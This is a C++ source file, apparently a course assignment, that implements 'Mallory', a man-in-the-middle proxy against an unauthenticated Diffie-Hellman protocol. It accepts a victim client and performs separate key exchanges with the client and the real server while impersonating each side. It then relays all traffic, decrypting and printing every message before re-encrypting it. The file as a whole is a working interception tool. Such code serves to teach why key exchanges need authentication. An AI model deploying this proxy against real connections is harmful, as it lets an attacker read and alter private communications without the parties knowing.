#include "crypto.h"
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

bool recv_line(int sock, std::string& line) {
    line.clear();
    char ch;
    while (true) {
        ssize_t r = recv(sock, &ch, 1, 0);
        if (r <= 0) return false;
        if (ch == '\n') break;
        if (ch != '\r') line += ch;
    }
    return true;
}

bool send_line(int sock, const std::string& line) {
    std::string data = line + "\n";
    return send(sock, data.c_str(), data.length(), 0) == (ssize_t)data.length();
}

void forward_traffic(int from_sock, int to_sock, 
                     const std::vector<unsigned char>& decrypt_key,
                     const std::vector<unsigned char>& encrypt_key,
                     const std::string& direction_label,
                     std::atomic<bool>& running) {
    while (running) {
        std::string plaintext;
        if (!recv_encrypted_packet(from_sock, plaintext, decrypt_key)) {
            running = false;
            break;
        }

        // Intercept and print plaintext payload in bright alert formatting
        std::cout << "\033[1;31m[MALLORY INTERCEPT] (" << direction_label << "): " 
                  << "\033[1;36m" << plaintext << "\033[0m" << std::endl;

        if (!send_encrypted_packet(to_sock, plaintext, encrypt_key)) {
            running = false;
            break;
        }
    }
}

void handle_mitm_session(int client_sock, std::string server_ip, int server_port) {
    std::cout << "\n\033[1;33m[MALLORY] Victim client connected! Starting MITM attack...\033[0m" << std::endl;

    // 1. Perform DH Handshake 1 with Client (Mallory pretends to be the Server)
    DHExchange dh_client;
    if (!dh_client.generate_keypair()) {
        close(client_sock);
        return;
    }

    std::string client_pub_hex;
    if (!recv_line(client_sock, client_pub_hex)) {
        close(client_sock);
        return;
    }

    if (!send_line(client_sock, dh_client.get_public_key_hex())) {
        close(client_sock);
        return;
    }

    std::vector<unsigned char> key_with_client;
    if (!dh_client.compute_shared_key(client_pub_hex, key_with_client)) {
        close(client_sock);
        return;
    }

    std::cout << "[MALLORY] Key 1 established with Client! Fingerprint: " 
              << DHExchange::get_fingerprint_hex(key_with_client) << std::endl;

    // 2. Connect to Real Server and perform DH Handshake 2 (Mallory pretends to be the Client)
    int server_sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in srv_addr;
    memset(&srv_addr, 0, sizeof(srv_addr));
    srv_addr.sin_family = AF_INET;
    srv_addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip.c_str(), &srv_addr.sin_addr);

    if (connect(server_sock, (struct sockaddr*)&srv_addr, sizeof(srv_addr)) < 0) {
        std::cerr << "[MALLORY ERROR] Could not connect to real server." << std::endl;
        close(client_sock);
        return;
    }

    DHExchange dh_server;
    if (!dh_server.generate_keypair()) {
        close(client_sock);
        close(server_sock);
        return;
    }

    if (!send_line(server_sock, dh_server.get_public_key_hex())) {
        close(client_sock);
        close(server_sock);
        return;
    }

    std::string server_pub_hex;
    if (!recv_line(server_sock, server_pub_hex)) {
        close(client_sock);
        close(server_sock);
        return;
    }

    std::vector<unsigned char> key_with_server;
    if (!dh_server.compute_shared_key(server_pub_hex, key_with_server)) {
        close(client_sock);
        close(server_sock);
        return;
    }

    std::cout << "[MALLORY] Key 2 established with Server! Fingerprint: " 
              << DHExchange::get_fingerprint_hex(key_with_server) << std::endl;
    std::cout << "\033[1;32m[MALLORY] Proxy active. Eavesdropping on all decrypted messages below:\033[0m\n" << std::endl;

    // 3. Bidirectional transparent relay & decryption loop
    std::atomic<bool> running(true);
    std::thread t1(forward_traffic, client_sock, server_sock, std::ref(key_with_client), std::ref(key_with_server), "Client -> Server", std::ref(running));
    std::thread t2(forward_traffic, server_sock, client_sock, std::ref(key_with_server), std::ref(key_with_client), "Server -> Client", std::ref(running));

    t1.join();
    t2.join();

    close(client_sock);
    close(server_sock);
    std::cout << "[MALLORY] Session finished." << std::endl;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <listen_port> <real_server_ip> <real_server_port>" << std::endl;
        return 1;
    }

    int listen_port = std::atoi(argv[1]);
    std::string server_ip = argv[2];
    int server_port = std::atoi(argv[3]);

    int listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);

    bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(listen_sock, 5);

    std::cout << "==================================================" << std::endl;
    std::cout << "   CS6008 Phase 2 MITM Attack Proxy (Mallory)" << std::endl;
    std::cout << "   Listening on port " << listen_port << " -> Forwarding to " << server_ip << ":" << server_port << std::endl;
    std::cout << "==================================================" << std::endl;

    while (true) {
        struct sockaddr_in client_addr;
        socklen_t len = sizeof(client_addr);
        int client_sock = accept(listen_sock, (struct sockaddr*)&client_addr, &len);
        if (client_sock < 0) continue;

        std::thread(handle_mitm_session, client_sock, server_ip, server_port).detach();
    }

    close(listen_sock);
    return 0;
}
